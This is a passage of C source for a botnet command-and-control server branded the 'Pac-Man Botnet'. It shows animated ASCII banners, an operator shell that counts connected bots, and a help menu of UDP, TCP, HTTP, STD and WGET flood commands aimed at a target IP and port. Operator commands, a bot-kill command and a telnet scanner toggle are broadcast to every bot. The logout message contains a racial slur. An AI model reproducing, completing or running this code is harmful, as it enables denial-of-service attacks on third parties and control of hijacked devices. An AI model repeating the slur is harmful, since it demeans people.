  sprintf(haha8asciibannerline3,   "\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\e[93mâ–ˆâ–ˆâ–ˆâ–„â–ˆâ–ˆâ–ˆâ–„\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\r\n");
  sprintf(haha8asciibannerline4,   "\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\e[93mâ–â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\r\n");
  sprintf(haha8asciibannerline5,   "\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\e[93mâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–€\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\r\n");
  sprintf(haha8asciibannerline6,   "\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\e[93mâ–€â–ˆâ–ˆâ–ˆâ–ˆâ–€\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\r\n");
  sprintf(haha8asciibannerline7,   "\e[90mÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â \r\n");

		if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, haha8asciibannerline1, strlen(haha8asciibannerline1), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, haha8asciibannerline2, strlen(haha8asciibannerline2), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, haha8asciibannerline3, strlen(haha8asciibannerline3), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, haha8asciibannerline4, strlen(haha8asciibannerline4), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, haha8asciibannerline5, strlen(haha8asciibannerline5), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, haha8asciibannerline6, strlen(haha8asciibannerline6), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, haha8asciibannerline7, strlen(haha8asciibannerline7), MSG_NOSIGNAL) == -1) goto end;
		sleep(1);
		sprintf(clearscreen, "\033[2J\033[1;1H");

		char lmfao9asciibannerline1   [5000];
		char lmfao9asciibannerline2   [5000];
		char lmfao9asciibannerline3   [5000];
		char lmfao9asciibannerline4   [5000];
		char lmfao9asciibannerline5   [5000];
		char lmfao9asciibannerline6   [5000];
		char lmfao9asciibannerline7   [5000];
		
  sprintf(lmfao9asciibannerline1,   "\e[90mÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â \r\n");
  sprintf(lmfao9asciibannerline2,   "\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\e[93mâ–„â–ˆâ–ˆâ–ˆâ–ˆâ–„\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\r\n");
  sprintf(lmfao9asciibannerline3,   "\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\e[93mâ–ˆâ–ˆâ–ˆâ–„â–ˆâ–€\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\r\n");
  sprintf(lmfao9asciibannerline4,   "\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\e[93mâ–â–ˆâ–ˆâ–ˆâ–ˆ\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\r\n");
  sprintf(lmfao9asciibannerline5,   "\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\e[93mâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–„\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\r\n");
  sprintf(lmfao9asciibannerline6,   "\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\e[93mâ–€â–ˆâ–ˆâ–ˆâ–ˆâ–€\e[34mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\r\n");
  sprintf(lmfao9asciibannerline7,   "\e[90mÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â \r\n");

		if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, lmfao9asciibannerline1, strlen(lmfao9asciibannerline1), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, lmfao9asciibannerline2, strlen(lmfao9asciibannerline2), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, lmfao9asciibannerline3, strlen(lmfao9asciibannerline3), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, lmfao9asciibannerline4, strlen(lmfao9asciibannerline4), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, lmfao9asciibannerline5, strlen(lmfao9asciibannerline5), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, lmfao9asciibannerline6, strlen(lmfao9asciibannerline6), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, lmfao9asciibannerline7, strlen(lmfao9asciibannerline7), MSG_NOSIGNAL) == -1) goto end;
		sleep(1);
		sprintf(clearscreen, "\033[2J\033[1;1H");

		char empty10asciibannerline1   [5000];
		char empty10asciibannerline2   [5000];
		char empty10asciibannerline3   [5000];
		char empty10asciibannerline4   [5000];
		char empty10asciibannerline5   [5000];
		char empty10asciibannerline6   [5000];
		char empty10asciibannerline7   [5000];
		
  sprintf(empty10asciibannerline1,   "\e[90mÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â \r\n");
  sprintf(empty10asciibannerline2,   "\e[34m\r\n");
  sprintf(empty10asciibannerline3,   "\e[34m\r\n");
  sprintf(empty10asciibannerline4,   "\e[34m\r\n");
  sprintf(empty10asciibannerline5,   "\e[34m\r\n");
  sprintf(empty10asciibannerline6,   "\e[34m\r\n");
  sprintf(empty10asciibannerline7,   "\e[90mÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â \r\n");

		if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, empty10asciibannerline1, strlen(empty10asciibannerline1), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, empty10asciibannerline2, strlen(empty10asciibannerline2), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, empty10asciibannerline3, strlen(empty10asciibannerline3), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, empty10asciibannerline4, strlen(empty10asciibannerline4), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, empty10asciibannerline5, strlen(empty10asciibannerline5), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, empty10asciibannerline6, strlen(empty10asciibannerline6), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, empty10asciibannerline7, strlen(empty10asciibannerline7), MSG_NOSIGNAL) == -1) goto end;
		sleep(1);
		sprintf(clearscreen, "\033[2J\033[1;1H");

		char pacman11asciibannerline1   [5000];
		char pacman11asciibannerline2   [5000];
		char pacman11asciibannerline3   [5000];
		char pacman11asciibannerline4   [5000];
		char pacman11asciibannerline5   [5000];
		char pacman11asciibannerline6   [5000];
		char pacman11asciibannerline7   [5000];
		char pacman11asciibannerline8   [5000];
		char pacman11asciibannerline9   [5000];
		char pacman11asciibannerline10   [5000];
		char pacman11asciibannerline11   [5000];
		
  sprintf(pacman11asciibannerline1,   "\e[90mÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â \r\n");
  sprintf(pacman11asciibannerline2,   "\e[93m       ########     ###     ######           ##     ##    ###    ##    ## \r\n");
  sprintf(pacman11asciibannerline3,   "\e[93m       ##     ##   ## ##   ##    ##          ###   ###   ## ##   ###   ## \r\n");
  sprintf(pacman11asciibannerline4,   "\e[93m       ########  ##     ## ##       #######  ## ### ## ##     ## ## ## ## \r\n");
  sprintf(pacman11asciibannerline5,   "\e[93m       ##        ######### ##                ##     ## ######### ##  #### \r\n");																																									//278e1c93e9c197d7eb07829bc6cf205d
  sprintf(pacman11asciibannerline6,   "\e[93m       ##        ##     ## ##    ##          ##     ## ##     ## ##   ### \r\n");
  sprintf(pacman11asciibannerline7,   "\e[93m       ##        ##     ##  ######           ##     ## ##     ## ##    ## \r\n");
  sprintf(pacman11asciibannerline8,   "\e[90mÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â \r\n");
  sprintf(pacman11asciibannerline9,   "\e[93m		  [\e[97m+\e[93m] \e[97mWelcome to the \e[93mPac-Man \e[97mBotnet \e[93m[\e[97m+\e[93m]		\r\n");
  sprintf(pacman11asciibannerline10,  "\e[93m		  [\e[97m+\e[93m] \e[93mPac-Man \e[97mServerside by switch  \e[93m[\e[97m+\e[93m]		\r\n");
  sprintf(pacman11asciibannerline11,  "\e[90mÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â \r\n");

		if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, pacman11asciibannerline1, strlen(pacman11asciibannerline1), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, pacman11asciibannerline2, strlen(pacman11asciibannerline2), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, pacman11asciibannerline3, strlen(pacman11asciibannerline3), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, pacman11asciibannerline4, strlen(pacman11asciibannerline4), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, pacman11asciibannerline5, strlen(pacman11asciibannerline5), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, pacman11asciibannerline6, strlen(pacman11asciibannerline6), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, pacman11asciibannerline7, strlen(pacman11asciibannerline7), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, pacman11asciibannerline8, strlen(pacman11asciibannerline8), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, pacman11asciibannerline9, strlen(pacman11asciibannerline9), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, pacman11asciibannerline10, strlen(pacman11asciibannerline10), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, pacman11asciibannerline11, strlen(pacman11asciibannerline11), MSG_NOSIGNAL) == -1) goto end;
		sleep(1);
		sprintf(clearscreen, "\033[2J\033[1;1H");
		while(1) {
		char input [5000];
        sprintf(input, "\e[93mPacMan\e[97m# ", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		break;
		}
		pthread_create(&title, NULL, &TitleWriter, sock);
        managements[datafd].connected = 1;

		while(fdgets(buf, sizeof buf, datafd) > 0) {   
			if(strstr(buf, "BOTS")) {
				char botcount [2048];
				memset(botcount, 0, 2048);
				char statuscount [2048];
				char ops [2048];
				memset(statuscount, 0, 2048);
				sprintf(botcount,    "\e[93mGhosts Connected: \e[97m%d\r\n", BotsConnected(), OperatorsConnected);		
				sprintf(statuscount, "\e[93mDuplicated Ghosts: \e[97m%d\r\n", TELFound, scannerreport);
				sprintf(ops,         "\e[93mUsers Online: \e[97m%d\r\n", OperatorsConnected, scannerreport);
				if(send(datafd, botcount, strlen(botcount), MSG_NOSIGNAL) == -1) return;
				if(send(datafd, statuscount, strlen(statuscount), MSG_NOSIGNAL) == -1) return;
				if(send(datafd, ops, strlen(ops), MSG_NOSIGNAL) == -1) return;
		char input [5000];
        sprintf(input, "\e[93mPacMan\e[97m# ", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
			}
			
			if(strstr(buf, "HELP")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char hp1  [800];
				char hp2  [800];
				char hp3  [800];
				char hp4  [800];
				char hp5  [800];
				char hp6  [800];
				char hp7  [800];
				char hp8  [800];
				char hp9  [800];
				char hp10  [800];
				char hp11  [800];

				sprintf(hp1,  "\e[97m>---\e[93mList Of Commands\e[97m---<\r\n");
				sprintf(hp2,  "\e[97m!* WGET URL TIME\r\n");
				sprintf(hp3,  "\e[97m!* HTTP METHOD IP PORT PATH TIME POWER\r\n");
				sprintf(hp4,  "\e[97m!* STD IP PORT TIME\r\n");
				sprintf(hp5,  "\e[97m!* UDP IP PORT TIME SIZE 0 32\r\n");
				sprintf(hp6,  "\e[97m!* TCP IP PORT TIME FLAGS SIZE 0 32\r\n");
				sprintf(hp7,  "\e[97m>---\e[93mServerside Commands\e[97m---<\r\n");
				sprintf(hp8,  "\e[97m!* TELNET \e[93m| \e[32mON \e[93m| \e[31mOFF \e[93m|\r\n");
				sprintf(hp9,  "\e[97mLOGOUT\r\n");
				sprintf(hp10, "\e[97mSTOP\r\n");
				sprintf(hp11, "\e[97mCLEAR\r\n");

				if(send(datafd, hp1,  strlen(hp1), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp2,  strlen(hp2), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp3,  strlen(hp3), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp4,  strlen(hp4), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp5,  strlen(hp5), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp6,  strlen(hp6), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp7,  strlen(hp7), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp8,  strlen(hp8), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp9,  strlen(hp9), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp10,  strlen(hp10), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp11,  strlen(hp11), MSG_NOSIGNAL) == -1) goto end;
				
				pthread_create(&title, NULL, &TitleWriter, sock);
		char input [5000];
        sprintf(input, "\e[93mPacMan\e[97m# ", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
 		}
			if(strstr(buf, "!* BOTKILL")) {
				char gtfomynet [2048];
				memset(gtfomynet, 0, 2048);
				sprintf(gtfomynet, "!* BOTKILL\r\n");
				broadcast(buf, datafd, gtfomynet);
				continue;
			}
			if(strstr(buf, "STOP"))
			{
				char killattack [2048];
				memset(killattack, 0, 2048);
				char killattack_msg [2048];
				
				sprintf(killattack, "\e[97m[\e[93mPacMan\e[97m] \e[31mATTACKS STOPPED\r\n");
				broadcast(killattack, datafd, "output.");
				if(send(datafd, killattack, strlen(killattack), MSG_NOSIGNAL) == -1) goto end;
				while(1) {
		char input [5000];
        sprintf(input, "\e[93mPacMan\e[97m# ", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
			if(strstr(buf, "CLEAR")) {
				char clearscreen [2048];
				memset(clearscreen, 0, 2048);
				sprintf(clearscreen, "\033[2J\033[1;1H");
				if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, pacman11asciibannerline1, strlen(pacman11asciibannerline1), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, pacman11asciibannerline2, strlen(pacman11asciibannerline2), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, pacman11asciibannerline3, strlen(pacman11asciibannerline3), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, pacman11asciibannerline4, strlen(pacman11asciibannerline4), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, pacman11asciibannerline5, strlen(pacman11asciibannerline5), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, pacman11asciibannerline6, strlen(pacman11asciibannerline6), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, pacman11asciibannerline7, strlen(pacman11asciibannerline7), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, pacman11asciibannerline8, strlen(pacman11asciibannerline8), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, pacman11asciibannerline9, strlen(pacman11asciibannerline9), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, pacman11asciibannerline10, strlen(pacman11asciibannerline10), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, pacman11asciibannerline11, strlen(pacman11asciibannerline11), MSG_NOSIGNAL) == -1) goto end;
				while(1) {
		char input [5000];
        sprintf(input, "\e[93mPacMan\e[97m# ", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
			if(strstr(buf, "LOGOUT")) {
			pthread_create(&title, NULL, &TitleWriter, sock);
			char logoutmessage1 [2048];
			char logoutmessage2 [2048];
			char logoutmessage3 [2048];
			char logoutmessage4 [2048];
			char logoutmessage5 [2048];
			char logoutmessage6 [2048];

			sprintf(logoutmessage1, "\e[90m        _    _\r\n");
			sprintf(logoutmessage2, "     \e[97m__\e[38;5;202m|\e[97m_\e[38;5;202m|\e[97m__\e[38;5;202m|\e[97m_\e[38;5;202m|\e[97m__\r\n");
			sprintf(logoutmessage3, "\e[97m   \e[31m_\e[97m|\e[31m____________\e[97m|\e[31m__\r\n");
			sprintf(logoutmessage4, "\e[31m  |o o o o o o o o /  \r\n");
			sprintf(logoutmessage5, "\e[96m~~~~~~~~~~~~~~~~~~~~~~~~\r\n");
			sprintf(logoutmessage6, "\e[34mBIG BOATS MY NIGGA, YEET\r\n");

			if(send(datafd, logoutmessage1, strlen(logoutmessage1), MSG_NOSIGNAL) == -1)goto end;
			if(send(datafd, logoutmessage2, strlen(logoutmessage2), MSG_NOSIGNAL) == -1)goto end;
			if(send(datafd, logoutmessage3, strlen(logoutmessage3), MSG_NOSIGNAL) == -1)goto end;
			if(send(datafd, logoutmessage4, strlen(logoutmessage4), MSG_NOSIGNAL) == -1)goto end;
			if(send(datafd, logoutmessage5, strlen(logoutmessage5), MSG_NOSIGNAL) == -1)goto end;
			if(send(datafd, logoutmessage6, strlen(logoutmessage6), MSG_NOSIGNAL) == -1)goto end;
			sleep(5);
			goto end;
			}

            trim(buf);
		char input [5000];
        sprintf(input, "\e[93mPacMan\e[97m# ", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
            if(strlen(buf) == 0) continue;
            printf("%s: \"%s\"\n",accounts[find_line].username, buf);

			FILE *LogFile;
            LogFile = fopen("history.log", "a");
			time_t now;
			struct tm *gmt;
			char formatted_gmt [50];
			char lcltime[50];
			now = time(NULL);
			gmt = gmtime(&now);
			strftime ( formatted_gmt, sizeof(formatted_gmt), "%I:%M %p", gmt );
            fprintf(LogFile, "[%s] %s: %s\n", formatted_gmt, accounts[find_line].username, buf);
            fclose(LogFile);
            broadcast(buf, datafd, accounts[find_line].username);
            memset(buf, 0, 2048);
        }

		end:
		managements[datafd].connected = 0;
		close(datafd);
		OperatorsConnected--;
}
void *BotListener(int port) {
	int sockfd, newsockfd;
	socklen_t clilen;
    struct sockaddr_in serv_addr, cli_addr;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) perror("ERROR opening socket");
    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(port);
    if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
    listen(sockfd,5);
    clilen = sizeof(cli_addr);
    while(1) {
		newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
        if (newsockfd < 0) perror("ERROR on accept");
        pthread_t thread;
        pthread_create( &thread, NULL, &BotWorker, (void *)newsockfd);
}}
int main (int argc, char *argv[], void *sock) {
        signal(SIGPIPE, SIG_IGN);
        int s, threads, port;
        struct epoll_event event;
        if (argc != 4) {
			fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
			exit (EXIT_FAILURE);
        }
		port = atoi(argv[3]);
        telFD = fopen("telnet.txt", "a+");
        threads = atoi(argv[2]);
        listenFD = create_and_bind (argv[1]);
        if (listenFD == -1) abort ();
        s = make_socket_non_blocking (listenFD);
        if (s == -1) abort ();
        s = listen (listenFD, SOMAXCONN);
        if (s == -1) {
			perror ("listen");
			abort ();
        }
        epollFD = epoll_create1 (0);
        if (epollFD == -1) {
			perror ("epoll_create");
			abort ();
        }
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1) {
			perror ("epoll_ctl");
			abort ();
        }
        pthread_t thread[threads + 2];
        while(threads--) {
			pthread_create( &thread[threads + 1], NULL, &BotEventLoop, (void *) NULL);
        }
        pthread_create(&thread[0], NULL, &BotListener, port);
        while(1) {
			broadcast("PING", -1, "ZERO");
			sleep(60);
        }
        close (listenFD);
        return EXIT_SUCCESS;																																																																																					//278e1c93e9c197d7eb07829bc6cf205d
}
